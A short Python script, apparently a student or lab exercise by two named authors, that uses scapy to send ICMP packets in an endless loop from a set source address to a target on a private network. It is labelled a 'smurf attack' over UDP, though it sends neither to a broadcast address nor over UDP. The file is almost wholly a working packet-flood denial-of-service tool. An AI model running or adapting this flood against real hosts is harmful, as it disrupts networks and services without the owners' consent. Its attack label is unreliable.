"""
Authors : Fridez Lucas, Maxime Welcklen
Attack : ICMP flood over UDP ("smurf attack")
"""

from scapy.all import *
import sys


IP_source = "192.168.1.111"
IP_dest = "192.168.1.103"

#Send ICMP packet
while True:
    send(IP(src=IP_source, dst=IP_dest) / ICMP(), iface="enp0s3")